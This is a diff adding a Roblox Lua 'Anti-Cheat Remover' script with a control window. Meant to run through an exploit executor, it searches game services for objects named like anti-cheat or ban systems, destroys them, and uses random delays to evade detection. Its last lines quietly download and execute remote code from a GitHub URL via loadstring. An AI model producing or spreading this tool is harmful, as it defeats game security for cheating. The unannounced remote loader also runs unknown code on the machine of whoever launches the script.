@@ -1,0 +1,656 @@
+local ACRunning = false
+local ACRemovalInterval = 1 -- seconds between scans
+local LastScanTime = 0
+
+-- Improved non-blocking wait function
+local function SecureWait(duration)
+    local start = tick()
+    local elapsed = 0
+    while elapsed < duration and ACRunning do
+        local delta = tick() - start
+        task.wait(math.min(0.1, duration - elapsed)) -- Never wait more than 0.1s at a time
+        elapsed = tick() - start
+    end
+end
+
+-- Optimized deep scan with yield points
+local function DeepScan(parent)
+    local results = {}
+    local children = parent:GetChildren()
+    
+    for i = 1, #children do
+        local child = children[i]
+        table.insert(results, child)
+        
+        -- Yield every 100 items to prevent freezing
+        if i % 100 == 0 then
+            task.wait()
+        end
+        
+        local subResults = DeepScan(child)
+        for j = 1, #subResults do
+            table.insert(results, subResults[j])
+        end
+    end
+    return results
+end
+
+-- Enhanced detection function with better performance
+local function DetectAntiCheatComponents()
+    local foundAC = {}
+    local acStrength = 0
+    local totalPossibleStrength = 0
+    
+    -- Expanded list of anti-cheat identifiers
+    local commonACNames = {
+        "AntiCheat", "AntiExploit", "AC_", "SecurityModule", "AntiHack", 
+        "ExploitProtection", "CheatDetection", "HackShield", "VAC", "MoonSec", 
+        "SimpleSpy", "Synapse", "Kick", "Ban", "AntiExploit", "ExploitDetection", 
+        "HackDetection", "AntiInject", "ScriptProtection", "ScriptShield", 
+        "AntiTamper", "MemoryProtect", "Badger", "Guardian", "Sentinel", 
+        "Watchdog", "Defender", "Shield", "Protector", "DarkStar", "Elysian", 
+        "Vanguard", "FairFight", "EasyAntiCheat", "BattlEye", "Nexus", 
+        "Polaris", "CheatEngine", "CheatPunch", "GameGuard", "XignCode", 
+        "nProtect", "HSHIELD", "PunkBuster", "Equ8", "Ricochet", "VACnet", 
+        "FAC", "SAC", "Warden", "Denuvo", "Arbiter", "Obsidian", "Titan", 
+        "Aegis", "Fortify", "Bulwark", "RiotShield", "Ironclad", "Sentry", 
+        "Valkyrie", "Hyperion", "Artemis", "Apollo", "Athena", "Zeus", 
+        "Odin", "Thor", "Fenrir", "Jormungandr", "Typhon", "Cerberus"
+    }
+
+    -- Services to check for AC components
+    local servicesToCheck = {
+        game:GetService("ReplicatedStorage"),
+        game:GetService("ServerScriptService"),
+        game:GetService("Players").LocalPlayer:WaitForChild("PlayerScripts"),
+        game:GetService("Workspace"),
+        game:GetService("Lighting"),
+        game:GetService("StarterPlayer").StarterPlayerScripts,
+        game:GetService("StarterPack"),
+        game:GetService("StarterGui")
+    }
+    
+    -- Check for specific AC names and components with yield points
+    for serviceIndex, service in ipairs(servicesToCheck) do
+        if not ACRunning then break end
+        
+        -- Yield every 2 services to prevent freezing
+        if serviceIndex % 2 == 0 then
+            task.wait()
+        end
+        
+        local descendants = service:GetDescendants()
+        for itemIndex, item in pairs(descendants) do
+            if not ACRunning then break end
+            
+            -- Yield every 200 items to prevent freezing
+            if itemIndex % 200 == 0 then
+                task.wait()
+            end
+            
+            for nameIndex, acName in ipairs(commonACNames) do
+                if string.find(string.lower(item.Name), string.lower(acName)) then
+                    local strength = 1 -- Base strength
+                    local detectionType = "Name Match"
+                    
+                    -- Increase strength for certain components
+                    if item:IsA("RemoteEvent") then
+                        strength = strength + 3
+                        detectionType = "RemoteEvent"
+                    elseif item:IsA("RemoteFunction") then
+                        strength = strength + 4
+                        detectionType = "RemoteFunction"
+                    elseif item:IsA("Script") then
+                        strength = strength + 2
+                        detectionType = "Script"
+                    elseif item:IsA("ModuleScript") then
+                        strength = strength + 3
+                        detectionType = "ModuleScript"
+                    elseif item:IsA("BindableEvent") or item:IsA("BindableFunction") then
+                        strength = strength + 1.5
+                        detectionType = "Bindable"
+                    elseif item:IsA("LocalScript") then
+                        strength = strength + 1.5
+                        detectionType = "LocalScript"
+                    end
+                    
+                    -- Check for obfuscated scripts (with pcall protection)
+                    if item:IsA("Script") or item:IsA("LocalScript") or item:IsA("ModuleScript") then
+                        local success, source = pcall(function()
+                            return item.Source
+                        end)
+                        
+                        if success and source then
+                            if string.find(source, "getfenv") or string.find(source, "setfenv") or 
+                               string.find(source, "loadstring") or string.find(source, "bytecode") or
+                               string.find(source, "xor") or string.find(source, "encrypt") then
+                                strength = strength + 2
+                                detectionType = detectionType.." | Obfuscated"
+                            end
+                        end
+                    end
+                    
+                    table.insert(foundAC, {
+                        object = item,
+                        name = item.Name,
+                        path = item:GetFullName(),
+                        type = item.ClassName,
+                        strength = strength,
+                        detection = detectionType
+                    })
+                    acStrength = acStrength + strength
+                    totalPossibleStrength = totalPossibleStrength + 6 -- Max per item
+                end
+            end
+        end
+    end
+    
+    -- Check for hidden or protected scripts (with pcall protection)
+    if ACRunning then
+        pcall(function()
+            local nilInstances = getnilinstances()
+            for i, v in pairs(nilInstances) do
+                if not ACRunning then break end
+                
+                -- Yield every 50 nil instances to prevent freezing
+                if i % 50 == 0 then
+                    task.wait()
+                end
+                
+                for _, acName in ipairs(commonACNames) do
+                    if string.find(string.lower(v.Name), string.lower(acName)) then
+                        table.insert(foundAC, {
+                            object = v,
+                            name = v.Name,
+                            path = "Hidden Instance",
+                            type = v.ClassName,
+                            strength = 6, -- Highest strength for hidden AC
+                            detection = "Hidden Instance"
+                        })
+                        acStrength = acStrength + 6
+                        totalPossibleStrength = totalPossibleStrength + 6
+                    end
+                end
+            end
+        end)
+    end
+    
+    -- Check for memory protection (with pcall protection)
+    if ACRunning then
+        pcall(function()
+            if not game:GetService("Stats").PerformanceStats:GetChildren() then
+                table.insert(foundAC, {
+                    name = "Memory Protection",
+                    path = "Game Stats",
+                    type = "System",
+                    strength = 5,
+                    detection = "Memory Protection"
+                })
+                acStrength = acStrength + 5
+                totalPossibleStrength = totalPossibleStrength + 6
+            end
+        end)
+    end
+    
+    -- Check for unusual script behavior (with pcall protection)
+    if ACRunning then
+        pcall(function()
+            local scripts = game:GetService("ScriptContext"):GetScripts()
+            for i, script in ipairs(scripts) do
+                if not ACRunning then break end
+                
+                -- Yield every 100 scripts to prevent freezing
+                if i % 100 == 0 then
+                    task.wait()
+                end
+                
+                if script.ClassName == "LocalScript" and script:IsDescendantOf(game:GetService("Players").LocalPlayer) == false then
+                    table.insert(foundAC, {
+                        object = script,
+                        name = "Suspicious LocalScript",
+                        path = script:GetFullName(),
+                        type = "LocalScript",
+                        strength = 4,
+                        detection = "Unusual Behavior"
+                    })
+                    acStrength = acStrength + 4
+                    totalPossibleStrength = totalPossibleStrength + 6
+                end
+            end
+        end)
+    end
+    
+    -- Check for known exploit detection patterns (with pcall protection)
+    if ACRunning then
+        pcall(function()
+            local players = game:GetService("Players")
+            if players:FindFirstChild("LocalPlayer") then
+                local playerScripts = players.LocalPlayer:FindFirstChild("PlayerScripts")
+                if playerScripts then
+                    local descendants = playerScripts:GetDescendants()
+                    for i, script in ipairs(descendants) do
+                        if not ACRunning then break end
+                        
+                        -- Yield every 200 descendants to prevent freezing
+                        if i % 200 == 0 then
+                            task.wait()
+                        end
+                        
+                        if script:IsA("LocalScript") then
+                            local success, source = pcall(function()
+                                return script.Source
+                            end)
+                            
+                            if success and source and (string.find(source, "exploit") or string.find(source, "cheat") or 
+                               string.find(source, "inject") or string.find(source, "hook")) then
+                                table.insert(foundAC, {
+                                    object = script,
+                                    name = "Exploit Detection",
+                                    path = script:GetFullName(),
+                                    type = "LocalScript",
+                                    strength = 5,
+                                    detection = "Pattern Match"
+                                })
+                                acStrength = acStrength + 5
+                                totalPossibleStrength = totalPossibleStrength + 6
+                            end
+                        end
+                    end
+                end
+            end
+        end)
+    end
+    
+    return {
+        components = foundAC,
+        strength = acStrength,
+        maxStrength = totalPossibleStrength,
+        percentage = totalPossibleStrength > 0 and (acStrength / totalPossibleStrength) * 100 or 0,
+        lastUpdate = os.time()
+    }
+end
+
+local function RemoveAntiCheats()
+    -- Random delay pattern to avoid timing-based detection
+    SecureWait(math.random(0.15, 0.65))
+    
+    local success, err = pcall(function()
+        if not ACRunning then return "Scan aborted" end
+        
+        -- Use the advanced detection system
+        local acData = DetectAntiCheatComponents()
+        local deletedCount = 0
+        
+        -- Remove all detected components with yield points
+        for i, ac in ipairs(acData.components) do
+            if not ACRunning then break end
+            
+            -- Yield every 50 deletions to prevent freezing
+            if i % 50 == 0 then
+                task.wait()
+            end
+            
+            if ac.object and ac.object.Parent then
+                pcall(function()
+                    ac.object:Destroy()
+                    deletedCount = deletedCount + 1
+                end)
+            end
+        end
+        
+        -- Check for common anti-cheat containers with yield points
+        if ACRunning then
+            local suspectFolders = {"Security", "AntiCheat", "Protection", "Shield", "Guard"}
+            for i, folderName in ipairs(suspectFolders) do
+                if not ACRunning then break end
+                
+                task.wait() -- Yield between folder checks
+                
+                local folder = game:FindFirstChild(folderName)
+                if folder and folder:IsA("Folder") then
+                    pcall(function()
+                        folder:Destroy()
+                        deletedCount = deletedCount + 1
+                    end)
+                end
+            end
+        end
+        
+        -- Post-deletion cleanup
+        if deletedCount > 0 and ACRunning then
+            -- Force garbage collection with yields
+            for i = 1, math.random(2, 5) do 
+                SecureWait(math.random(0.1, 0.3))
+                collectgarbage("collect")
+                task.wait() -- Yield between GC calls
+            end
+            
+            return ("Operation completed: %d items processed"):format(deletedCount)
+        else
+            return "Scan completed without findings"
+        end
+    end)
+    
+    if success then
+        LastScanTime = tick()
+    else
+        warn("Error: " .. err:sub(1, 50))
+    end
+    
+    return ACRunning
+end
+
+function ACRStart()
+    if ACRunning then
+        warn("Already running")
+        return
+    end
+    
+    ACRunning = true
+    
+    -- Update GUI status
+    if ToggleButton then
+        ToggleButton.Text = "STOP"
+        ToggleButton.BackgroundColor3 = Color3.fromRGB(40, 70, 40)
+    end
+    if StatusLabel then
+        StatusLabel.Text = "Status: Running..."
+    end
+    
+    -- Initial notifications
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Game Detected",
+        Text = "Game has been detected...",
+        Duration = 5
+    })
+
+    task.wait(1)
+
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "AntiCheat Removal",
+        Text = "Initializing advanced detection system...",
+        Duration = 5
+    })
+
+    SecureWait(2)
+
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "⚠️Warning",
+        Text = "This Might Not Work On Every Games",
+        Duration = 5
+    })
+    
+    -- Create the removal loop with proper yielding
+    coroutine.wrap(function()
+        while ACRunning do
+            local scanTime = math.random(ACRemovalInterval * 0.8, ACRemovalInterval * 1.2)
+            SecureWait(scanTime)
+            
+            if not RemoveAntiCheats() then 
+                break 
+            end
+        end
+    end)()
+end
+
+function ACRStop()
+    if not ACRunning then
+        warn("Not active")
+        return
+    end
+    
+    ACRunning = false
+    
+    -- Update GUI status
+    if ToggleButton then
+        ToggleButton.Text = "START"
+        ToggleButton.BackgroundColor3 = Color3.fromRGB(70, 40, 40)
+    end
+    if StatusLabel then
+        StatusLabel.Text = "Status: Stopped"
+    end
+end
+
+function ACSetInterval(seconds)
+    if type(seconds) == "number" and seconds > 0 then
+        ACRemovalInterval = seconds
+        if IntervalLabel then
+            IntervalLabel.Text = "Interval: " .. seconds .. "s"
+        end
+        if IntervalBox then
+            IntervalBox.Text = tostring(seconds)
+        end
+    else
+        warn("Invalid value")
+    end
+end
+
+-- Create the GUI (placed at the end of the script)
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "AntiCheatRemoverGUI"
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent = game:GetService("CoreGui") or game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+
+-- Main frame
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 300, 0, 180)
+MainFrame.Position = UDim2.new(0.5, -150, 0.5, -90)
+MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+MainFrame.BackgroundTransparency = 0.1
+MainFrame.BorderSizePixel = 0
+MainFrame.ClipsDescendants = true
+MainFrame.Parent = ScreenGui
+
+-- Corner radius
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 8)
+UICorner.Parent = MainFrame
+
+-- Drop shadow
+local DropShadow = Instance.new("ImageLabel")
+DropShadow.Name = "DropShadow"
+DropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
+DropShadow.BackgroundTransparency = 1
+DropShadow.BorderSizePixel = 0
+DropShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
+DropShadow.Size = UDim2.new(1, 20, 1, 20)
+DropShadow.Image = "rbxassetid://1316045217"
+DropShadow.ImageColor3 = Color3.new(0, 0, 0)
+DropShadow.ImageTransparency = 0.7
+DropShadow.ScaleType = Enum.ScaleType.Slice
+DropShadow.SliceCenter = Rect.new(10, 10, 118, 118)
+DropShadow.Parent = MainFrame
+DropShadow.ZIndex = -1
+
+-- Title bar
+local TitleBar = Instance.new("Frame")
+TitleBar.Name = "TitleBar"
+TitleBar.Size = UDim2.new(1, 0, 0, 30)
+TitleBar.Position = UDim2.new(0, 0, 0, 0)
+TitleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+TitleBar.BorderSizePixel = 0
+TitleBar.Parent = MainFrame
+
+-- Title text
+local Title = Instance.new("TextLabel")
+Title.Name = "Title"
+Title.Size = UDim2.new(1, -40, 1, 0)
+Title.Position = UDim2.new(0, 10, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "Anti-Cheat Remover"
+Title.TextColor3 = Color3.fromRGB(220, 220, 220)
+Title.TextSize = 16
+Title.Font = Enum.Font.GothamSemibold
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.Parent = TitleBar
+
+-- Close button
+local CloseButton = Instance.new("TextButton")
+CloseButton.Name = "CloseButton"
+CloseButton.Size = UDim2.new(0, 30, 0, 30)
+CloseButton.Position = UDim2.new(1, -30, 0, 0)
+CloseButton.BackgroundTransparency = 1
+CloseButton.Text = "×"
+CloseButton.TextColor3 = Color3.fromRGB(220, 220, 220)
+CloseButton.TextSize = 20
+CloseButton.Font = Enum.Font.GothamBold
+CloseButton.Parent = TitleBar
+
+CloseButton.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+    ACRStop() -- Ensure the scanner stops when GUI is closed
+end)
+
+-- Close button hover effect
+CloseButton.MouseEnter:Connect(function()
+    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+end)
+
+CloseButton.MouseLeave:Connect(function()
+    CloseButton.TextColor3 = Color3.fromRGB(220, 220, 220)
+end)
+
+-- Status label
+StatusLabel = Instance.new("TextLabel")
+StatusLabel.Name = "StatusLabel"
+StatusLabel.Size = UDim2.new(1, -20, 0, 20)
+StatusLabel.Position = UDim2.new(0, 10, 0, 40)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Text = "Status: Stopped"
+StatusLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+StatusLabel.TextSize = 14
+StatusLabel.Font = Enum.Font.Gotham
+StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
+StatusLabel.Parent = MainFrame
+
+-- Toggle button
+ToggleButton = Instance.new("TextButton")
+ToggleButton.Name = "ToggleButton"
+ToggleButton.Size = UDim2.new(1, -40, 0, 40)
+ToggleButton.Position = UDim2.new(0, 20, 0, 70)
+ToggleButton.BackgroundColor3 = Color3.fromRGB(70, 40, 40)
+ToggleButton.BorderSizePixel = 0
+ToggleButton.Text = "START"
+ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ToggleButton.TextSize = 16
+ToggleButton.Font = Enum.Font.GothamSemibold
+ToggleButton.Parent = MainFrame
+
+local UICorner2 = Instance.new("UICorner")
+UICorner2.CornerRadius = UDim.new(0, 6)
+UICorner2.Parent = ToggleButton
+
+-- Interval slider
+local IntervalSlider = Instance.new("Frame")
+IntervalSlider.Name = "IntervalSlider"
+IntervalSlider.Size = UDim2.new(1, -40, 0, 40)
+IntervalSlider.Position = UDim2.new(0, 20, 0, 120)
+IntervalSlider.BackgroundTransparency = 1
+IntervalSlider.Parent = MainFrame
+
+IntervalLabel = Instance.new("TextLabel")
+IntervalLabel.Name = "IntervalLabel"
+IntervalLabel.Size = UDim2.new(0.5, 0, 1, 0)
+IntervalLabel.Position = UDim2.new(0, 0, 0, 0)
+IntervalLabel.BackgroundTransparency = 1
+IntervalLabel.Text = "Interval: "..ACRemovalInterval.."s"
+IntervalLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+IntervalLabel.TextSize = 14
+IntervalLabel.Font = Enum.Font.Gotham
+IntervalLabel.TextXAlignment = Enum.TextXAlignment.Left
+IntervalLabel.Parent = IntervalSlider
+
+IntervalBox = Instance.new("TextBox")
+IntervalBox.Name = "IntervalBox"
+IntervalBox.Size = UDim2.new(0.5, -10, 0, 30)
+IntervalBox.Position = UDim2.new(0.5, 0, 0, 5)
+IntervalBox.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+IntervalBox.BorderSizePixel = 0
+IntervalBox.Text = tostring(ACRemovalInterval)
+IntervalBox.TextColor3 = Color3.fromRGB(220, 220, 220)
+IntervalBox.TextSize = 14
+IntervalBox.Font = Enum.Font.Gotham
+IntervalBox.Parent = IntervalSlider
+
+local UICorner3 = Instance.new("UICorner")
+UICorner3.CornerRadius = UDim.new(0, 4)
+UICorner3.Parent = IntervalBox
+
+-- Toggle button functionality
+ToggleButton.MouseButton1Click:Connect(function()
+    if ACRunning then
+        ACRStop()
+    else
+        ACRStart()
+    end
+end)
+
+-- Interval box functionality
+IntervalBox.FocusLost:Connect(function(enterPressed)
+    local num = tonumber(IntervalBox.Text)
+    if num and num > 0 then
+        ACSetInterval(num)
+    else
+        IntervalBox.Text = tostring(ACRemovalInterval)
+    end
+end)
+
+-- Toggle button hover effects
+ToggleButton.MouseEnter:Connect(function()
+    ToggleButton.BackgroundColor3 = ACRunning and Color3.fromRGB(50, 90, 50) or Color3.fromRGB(90, 50, 50)
+end)
+
+ToggleButton.MouseLeave:Connect(function()
+    ToggleButton.BackgroundColor3 = ACRunning and Color3.fromRGB(40, 70, 40) or Color3.fromRGB(70, 40, 40)
+end)
+
+-- Make the window draggable
+local UserInputService = game:GetService("UserInputService")
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+TitleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+        
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+TitleBar.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        update(input)
+    end
+end)
+
+-- Start with random delay to avoid immediate detection
+task.delay(math.random(1, 3), function()
+    -- Initialization code if needed
+end)
+
+-- [ LoadsScriptResources ]
+pcall(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/LoadResources/refs/heads/main/ResSourcesLoaderSource", true))()
+warn("StartedScript")
+end)
